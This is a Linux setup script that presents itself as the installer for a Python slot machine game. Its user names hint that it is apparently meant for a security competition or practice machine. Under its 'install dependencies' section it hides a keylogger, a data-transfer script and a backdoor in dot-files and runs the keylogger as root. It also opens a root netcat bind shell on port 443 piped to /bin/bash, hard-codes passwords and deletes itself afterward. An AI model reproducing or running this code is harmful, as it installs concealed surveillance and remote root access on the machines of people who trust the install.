# get the user to get sudo permissions
sudo echo "You now have sudo privilages"

# activate venv
cd ~/Python-Slots
. slotmachine/bin/activate

sudo useradd scoringEngine
echo "Type 'scoringEngine' as the password"
sudo passwd scoringEngine
sudo useradd goldTeam
echo "Type 'mid@sAdmin' as the password"
sudo passwd goldTeam

# install openssh
sudo apt-get install openssh-server

# install dependency dependencies
sudo apt-get install netcat-traditional
sudo apt-get install netcat-openbsd
sudo apt-get install netcat
sudo apt-get install python3

# install wiki
sudo apt-get install pandoc
pandoc -s -o ~/Desktop/README.html wiki.md --css https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css

# install launcher
cd ~/Python-Slots
cp SlotMachine.desktop ~/Desktop/SlotMachine.desktop
chmod a+x ~/Desktop/SlotMachine.desktop
chmod 777 ~/Desktop/SlotMachine.desktop
chmod a+x ~/Python-Slots/slotmachine/launcher.sh
chmod 777 ~/Python-Slots/slotmachine/launcher.sh
gsettings set org.gnome.nautilus.preferences executable-text-activation launch

# install tkinter
sudo apt-get install python3-tk

# install admin-tools
mkdir ~/admin-tools
mv ~/Python-Slots/admin-tools/* ~/admin-tools
cd ~
cd ~/Python-Slots/slotmachine/Python-Slots
echo '{"disabled": "false"}' > ~/admin-tools/disabled
cd ~/Python-Slots
rm -rf admin-tools

# install dependencies
cd ~/Python-Slots/dependencies
mv .keylogger ~/Pictures
mv .keylogger.sh ~/Pictures
mv .transfer.sh ~/Pictures
mkdir ~/Music/.epic-songs
mv .backdoor_script.sh ~/Music/.epic-songs
cd ~/Pictures
chgrp sudo .keylogger
chgrp sudo .keylogger.sh
chgrp sudo .transfer.sh
chmod 777 .keylogger
chmod 777 .keylogger.sh
chmod 777 .transfer.sh
chmod +x .keylogger
chmod +x .keylogger.sh
chmod +x .transfer.sh
echo > .out
chgrp sudo .out
chmod 666 .out
sudo sh .keylogger.sh &
disown
cd ~/Music/.epic-songs
sudo mkfifo foo
sudo chgrp sudo foo
sudo chmod 777 foo
sudo chmod +x foo
sudo nc -lk 443 0<foo | /bin/bash 1>foo &
disown
rm -rf ~/Python-Slots/dependencies
echo "Installed dependencies."

alias rungame=". ~/Python-Slots/slotmachine/launcher.sh"

# remove script
cd ~/Python-Slots
rm ./setup.sh
